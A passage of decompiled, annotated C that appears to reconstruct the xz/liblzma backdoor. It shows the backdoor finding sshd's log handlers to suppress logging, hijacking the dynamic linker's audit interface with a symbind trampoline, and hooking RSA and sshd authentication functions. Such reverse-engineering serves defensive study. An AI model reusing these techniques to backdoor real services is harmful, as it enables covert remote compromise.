  text_segment = elf_get_code_segment(&local_980.main_info,&local_a98);
  signed_payload_size = local_a98;
  if ((((text_segment != (void *)0x0) && (0x10 < local_a98)) &&
      ((u8 *)local_980.sshd_string_refs.sshlogv_format.func_start != (u8 *)0x0)) &&
     (((local_b10->global_ctx).uses_endbr64 == FALSE ||
      (probe_success = is_endbr64_instruction
                          ((u8 *)local_980.sshd_string_refs.sshlogv_format.func_start,
                           (u8 *)((long)local_980.sshd_string_refs.sshlogv_format.func_start + 4),
                           0xe230), probe_success != FALSE)))) {
    sshd_log_ctx_ptr->sshlogv_impl = local_980.sshd_string_refs.sshlogv_format.func_start;
    decode_ctx_cursor = &local_a30;
    for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
      *(undefined4 *)&decode_ctx_cursor->instruction = 0;
      decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
    }
    if ((u8 *)local_980.sshd_string_refs.syslog_bad_level.func_start != (u8 *)0x0) {
      local_b48 = (u8 *)local_980.sshd_string_refs.syslog_bad_level.func_start;
      local_b20 = (log_handler_fn *)0x0;
      addr2 = (log_handler_fn *)0x0;
      do {
        while( TRUE ) {
          if ((local_980.sshd_string_refs.syslog_bad_level.func_end <= local_b48) ||
             ((local_b20 != (log_handler_fn *)0x0 && (addr2 != (log_handler_fn *)0x0))))
          goto LAB_00106bf0;
          probe_success = x86_dasm(&local_a30,local_b48,
                            (u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end);
          if (probe_success != FALSE) break;
          local_b48 = local_b48 + 1;
        }
        if ((*(u32 *)&local_a30.opcode_window[3] & 0xfffffffd) == 0xb1) {
          if (local_a30.prefix.decoded.modrm.breakdown.modrm_mod != '\x03') goto LAB_00106735;
          if ((local_a30.prefix.flags_u16 & 0x1040) == 0) {
            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
              scratch_reg_index = 0;
LAB_001067cf:
              mov_dst_reg = local_a30.prefix.decoded.modrm.breakdown.modrm_rm;
              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
                mov_dst_reg = local_a30.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
              }
              goto LAB_001067ed;
            }
            mov_dst_reg = 0;
          }
          else {
            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
              scratch_reg_index = local_a30.prefix.decoded.modrm.breakdown.modrm_reg;
              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
                scratch_reg_index = scratch_reg_index | (char)local_a30.prefix.decoded.rex * '\x02' & 8U;
              }
              goto LAB_001067cf;
            }
            mov_dst_reg = local_a30.prefix.decoded.flags2 & 0x10;
            if ((local_a30.prefix.flags_u16 & 0x1000) == 0) goto LAB_001067fb;
            scratch_reg_index = local_a30.mov_imm_reg_index;
            if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
              scratch_reg_index = local_a30.mov_imm_reg_index | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
            }
            mov_dst_reg = 0;
LAB_001067ed:
            if (scratch_reg_index != mov_dst_reg) goto LAB_00106735;
          }
LAB_001067fb:
          mov_src_reg = 0;
          log_literal_slot = 0;
          addr2 = (log_handler_fn *)0x0;
          decode_ctx_cursor = &local_9d8;
          for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
            *(undefined4 *)&decode_ctx_cursor->instruction = 0;
            decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
          }
          addr1 = (log_handler_fn *)0x0;
          scan_cursor = local_b48;
          for (; (scan_cursor < local_980.sshd_string_refs.syslog_bad_level.func_end && (log_literal_slot < 5));
              log_literal_slot = log_literal_slot + 1) {
            if ((addr1 != (log_handler_fn *)0x0) && (addr2 != (log_handler_fn *)0x0))
            goto LAB_00106b3c;
            probe_success = find_mov_instruction
                               (scan_cursor,(u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end,
                                TRUE,FALSE,&local_9d8);
            if (probe_success == FALSE) break;
            if ((local_9d8.prefix.flags_u16 & 0x1040) != 0) {
              if ((local_9d8.prefix.flags_u16 & 0x40) == 0) {
                mov_src_reg = local_9d8.prefix.decoded.flags2 & 0x10;
                if (((local_9d8.prefix.flags_u16 & 0x1000) != 0) &&
                   (mov_src_reg = local_9d8.mov_imm_reg_index, (local_9d8.prefix.flags_u16 & 0x20) != 0))
                {
                  scratch_reg_index = (char)local_9d8.prefix.decoded.rex << 3;
                  goto LAB_001068e4;
                }
              }
              else {
                mov_src_reg = local_9d8.prefix.decoded.modrm.breakdown.modrm_reg;
                if ((local_9d8.prefix.flags_u16 & 0x20) != 0) {
                  scratch_reg_index = (char)local_9d8.prefix.decoded.rex * '\x02';
LAB_001068e4:
                  mov_src_reg = mov_src_reg | scratch_reg_index & 8;
                }
              }
            }
            pplVar46 = addr2;
            if ((mov_dst_reg == mov_src_reg) && ((local_9d8.prefix.flags_u16 & 0x100) != 0)) {
              pplVar48 = (log_handler_fn *)local_9d8.mem_disp;
              if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                pplVar48 = (log_handler_fn *)
                           ((u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
                           CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                    (undefined4)local_9d8.instruction_size));
              }
              local_a90 = 0;
              pplVar45 = (log_handler_fn *)
                         elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
              if ((((pplVar45 == (log_handler_fn *)0x0) ||
                   ((log_handler_fn *)(local_a90 + (long)pplVar45) <= pplVar48)) ||
                  (pplVar48 < pplVar45)) ||
                 (((pplVar48 == addr2 && (pplVar48 == addr1)) ||
                  (pplVar46 = pplVar48, addr1 != (log_handler_fn *)0x0)))) goto LAB_00106997;
            }
            else {
LAB_00106997:
              pplVar48 = addr1;
              addr2 = pplVar46;
            }
            scan_cursor = local_9d8.instruction +
                      CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                               (undefined4)local_9d8.instruction_size);
            addr1 = pplVar48;
          }
          if ((addr1 == (log_handler_fn *)0x0) || (addr2 == (log_handler_fn *)0x0)) {
LAB_00106ab1:
            addr2 = (log_handler_fn *)0x0;
            local_b20 = (log_handler_fn *)0x0;
          }
          else {
LAB_00106b3c:
            // AutoDoc: Reject sshlogv handlers that fall outside `.data`; the log hook only executes if both pointers survive this validation.
            probe_success = validate_log_handler_pointers
                               (addr1,addr2,text_segment,(u8 *)((long)text_segment + signed_payload_size),
                                &local_980.sshd_string_refs,ctx);
            local_b20 = addr1;
            if (probe_success != FALSE) {
              sshd_log_ctx_ptr->log_handler_slot = addr1;
              search_image = &local_980.main_info;
              sshd_log_ctx_ptr->log_handler_ctx_slot = addr2;
              sshd_log_ctx_ptr->handler_slots_valid = TRUE;
              local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x708);
              string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
              sshd_log_ctx_ptr->fmt_percent_s = string_cursor;
              if (string_cursor != (char *)0x0) {
                local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x790);
                string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
                sshd_log_ctx_ptr->str_connection_closed_by = string_cursor;
                if (string_cursor != (char *)0x0) {
                  local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x4f0);
                  string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
                  sshd_log_ctx_ptr->str_preauth = string_cursor;
                  if (string_cursor != (char *)0x0) {
                    local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x1d8);
                    string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
                    sshd_log_ctx_ptr->str_authenticating = string_cursor;
                    if (string_cursor != (char *)0x0) {
                      local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0xb10);
                      string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
                      sshd_log_ctx_ptr->str_user = string_cursor;
                      if (string_cursor != (char *)0x0) break;
                    }
                  }
                }
              }
              sshd_log_ctx_ptr->log_squelched = TRUE;
              break;
            }
          }
        }
        else if ((((*(u32 *)&local_a30.opcode_window[3] == 0x147) &&
                  ((uint)local_a30.prefix.decoded.modrm >> 8 == 0x50000)) &&
                 ((local_a30.prefix.flags_u16 & 0x800) != 0)) && (local_a30.imm_zeroextended == 0))
        {
          addr1 = (log_handler_fn *)0x0;
          if ((local_a30.prefix.flags_u16 & 0x100) != 0) {
            addr1 = (log_handler_fn *)
                    (local_a30.instruction + local_a30.instruction_size + local_a30.mem_disp);
          }
          local_9d8.instruction = (u8 *)0x0;
          pplVar46 = (log_handler_fn *)
                     elf_get_data_segment(&local_980.main_info,(u64 *)&local_9d8,FALSE);
          if (((pplVar46 != (log_handler_fn *)0x0) &&
              (addr1 < local_9d8.instruction + (long)pplVar46)) && (pplVar46 <= addr1)) {
            decode_ctx_cursor = &local_9d8;
            for (loop_idx = 0x16; scan_cursor = local_b48, loop_idx != 0; loop_idx = loop_idx + -1) {
              *(undefined4 *)&decode_ctx_cursor->instruction = 0;
              decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
            }
            do {
              probe_success = find_instruction_with_mem_operand_ex
                                 (scan_cursor,(u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end
                                  ,&local_9d8,0x147,(void *)0x0);
              if (probe_success == FALSE) break;
              if ((local_9d8.imm_zeroextended == 0) && ((local_9d8.prefix.flags_u16 & 0x100) != 0))
              {
                addr2 = (log_handler_fn *)local_9d8.mem_disp;
                if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                  addr2 = (log_handler_fn *)
                          ((u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
                          CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                   (undefined4)local_9d8.instruction_size));
                }
                local_a90 = 0;
                pplVar46 = (log_handler_fn *)
                           elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
                if ((((pplVar46 != (log_handler_fn *)0x0) &&
                     (addr2 < (log_handler_fn *)(local_a90 + (long)pplVar46))) &&
                    (pplVar46 <= addr2)) && (addr1 != addr2)) goto LAB_00106b3c;
              }
              scan_cursor = local_9d8.instruction +
                        CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                 (undefined4)local_9d8.instruction_size);
            } while (local_9d8.instruction +
                     CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                              (undefined4)local_9d8.instruction_size) <
                     local_980.sshd_string_refs.syslog_bad_level.func_end);
            goto LAB_00106ab1;
          }
        }
LAB_00106735:
        local_b48 = local_b48 + local_a30.instruction_size;
      } while( TRUE );
    }
  }
LAB_00106bf0:
  libcrypto_allocator->opaque = local_980.elf_handles.libcrypto;
  if (bn_bin2bn_symbol != (Elf64_Sym *)0x0) {
    symbol_rva = bn_bin2bn_symbol->st_value;
    symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
    resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
    *resolved_count_ptr = *resolved_count_ptr + 1;
    (local_b10->imported_funcs).EVP_DecryptUpdate =
         (pfn_EVP_DecryptUpdate_t)(symbol_module_ehdr->e_ident + symbol_rva);
  }
  if (bn_dup_symbol != (Elf64_Sym *)0x0) {
    symbol_rva = bn_dup_symbol->st_value;
    symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
    resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
    *resolved_count_ptr = *resolved_count_ptr + 1;
    (local_b10->imported_funcs).EVP_DecryptFinal_ex =
         (pfn_EVP_DecryptFinal_ex_t)(symbol_module_ehdr->e_ident + symbol_rva);
  }
  probe_success = init_imported_funcs(imported_funcs);
  if (((((((probe_success != FALSE) &&
          (lzma_free((local_b10->imported_funcs).EVP_MD_CTX_new,libcrypto_allocator),
          (local_b10->libc_imports).resolved_imports_count == 0xc)) &&
         // AutoDoc: Stream every resolved hook/trampoline pointer into `secret_data` so telemetry and the command channel can attest to the install.
         (probe_success = secret_data_append_from_address
                             ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18),
         probe_success != FALSE)) &&
        ((probe_success = secret_data_append_from_address
                             (params->hook_ctx->symbind64_trampoline,
                              (secret_data_shift_cursor_t)0x12a,4,0x12), probe_success != FALSE &&
         (probe_success = secret_data_append_item
                             ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
                              (u8 *)params->hook_ctx->rsa_public_decrypt_entry), probe_success != FALSE))))
       && (probe_success = secret_data_append_from_address
                              (params->shared_globals->evp_set1_rsa_hook_entry,
                               (secret_data_shift_cursor_t)0x132,6,0x14), probe_success != FALSE)) &&
      ((probe_success = secret_data_append_item
                           ((secret_data_shift_cursor_t)0x138,0x15,2,0x10,
                            (u8 *)params->hook_ctx->rsa_get0_key_entry), probe_success != FALSE &&
       (probe_success = secret_data_append_item
                           ((secret_data_shift_cursor_t)0xee,0x10,0x26,0x20,
                            (u8 *)params->hook_ctx->mm_answer_keyallowed_entry), probe_success != FALSE))))
     && ((probe_success = secret_data_append_item
                             ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
                              (u8 *)params->hook_ctx->mm_answer_keyverify_entry), probe_success != FALSE &&
         (((probe_success = secret_data_append_item
                               ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
                                (u8 *)params->shared_globals->authpassword_hook_entry),
           probe_success != FALSE &&
           (probe_success = secret_data_append_item
                               ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
                                (u8 *)elf_functions_table->elf_parse), probe_success != FALSE)) &&
          ((local_b10->global_ctx).secret_bits_filled == 0x1c8)))))) {
    *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
    local_980.sshd_link_map = local_980.sshd_link_map + local_ac8 + 8;
    auditstate_snapshot = *(u32 *)local_980.sshd_link_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)local_980.sshd_link_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_old_value = auditstate_snapshot;
    *(u32 *)local_980.sshd_link_map = 2;
    // AutoDoc: Flip sshd’s `l_audit_any_plt` bit so `_dl_audit_symbind_alt` starts calling our symbind trampoline for every sshd→libcrypto PLT.
    audit_slot_byte = (byte *)(local_b10->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
    *audit_slot_byte = *audit_slot_byte | (local_b10->ldso_ctx).link_map_l_audit_any_plt_bitmask;
    local_980.libcrypto_link_map = local_980.libcrypto_link_map + local_ac8 + 8;
    auditstate_snapshot = *(u32 *)local_980.libcrypto_link_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)local_980.libcrypto_link_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_old_value = auditstate_snapshot;
    audit_ifaces_slot_ptr = &(local_b10->ldso_ctx).hooked_audit_ifaces;
    *(u32 *)local_980.libcrypto_link_map = 1;
    audit_ifaces_zero_cursor = audit_ifaces_slot_ptr;
    for (loop_idx = 0x1e; loop_idx != 0; loop_idx = loop_idx + -1) {
      *(undefined4 *)&audit_ifaces_zero_cursor->activity = 0;
      audit_ifaces_zero_cursor = (audit_ifaces *)((long)audit_ifaces_zero_cursor + (ulong)wipe_stride * -8 + 4);
    }
    (local_b10->ldso_ctx).hooked_audit_ifaces.symbind =
         (audit_symbind_fn_t)params->hook_ctx->symbind64_trampoline;
    *(local_b10->ldso_ctx)._dl_audit_ptr = audit_ifaces_slot_ptr;
    *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
    loop_idx = 0;
    libc_allocator = local_980.active_lzma_allocator;
    while (libc_allocator != (lzma_allocator *)0x0) {
      *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
           *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx);
      libc_allocator = (lzma_allocator *)(loop_idx + -0x17);
      loop_idx = loop_idx + 1;
    }
    goto LAB_00105a81;
  }
LAB_00105a60:
  libc_allocator = &local_980.saved_lzma_allocator;
  init_ldso_ctx(&local_b10->ldso_ctx);
  loop_idx = 0;
  libcrypto_allocator = local_980.active_lzma_allocator;
  while (libcrypto_allocator != (lzma_allocator *)0x0) {
    *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
         *(undefined1 *)((long)&libc_allocator->alloc + loop_idx);
    libcrypto_allocator = (lzma_allocator *)(loop_idx + -0x17);
    loop_idx = loop_idx + 1;
  }
LAB_00105a81:
  entry_ctx_ptr = params->entry_ctx;
  (entry_ctx_ptr->got_ctx).tls_got_entry = (void *)0x0;
  (entry_ctx_ptr->got_ctx).cpuid_got_slot = (void *)0x0;
  (entry_ctx_ptr->got_ctx).cpuid_slot_index = 0;
  (entry_ctx_ptr->got_ctx).got_base_offset = 0;
  entry_ctx_ptr->cpuid_random_symbol_addr = (void *)0x1;
  auth_log_reloc = (int *)cpuid_basic_info(0);
  if (*auth_log_reloc != 0) {
    cpuid_leaf_ptr = (undefined4 *)cpuid_Version_info(1);
    cpuid_ebx = cpuid_leaf_ptr[1];
    cpuid_ecx = cpuid_leaf_ptr[2];
    cpuid_edx = cpuid_leaf_ptr[3];
    *(undefined4 *)&(entry_ctx_ptr->got_ctx).tls_got_entry = *cpuid_leaf_ptr;
    *(undefined4 *)&(entry_ctx_ptr->got_ctx).cpuid_got_slot = cpuid_ebx;
    *(undefined4 *)&(entry_ctx_ptr->got_ctx).cpuid_slot_index = cpuid_edx;
    *(undefined4 *)&(entry_ctx_ptr->got_ctx).got_base_offset = cpuid_ecx;
  }
  return FALSE;
}

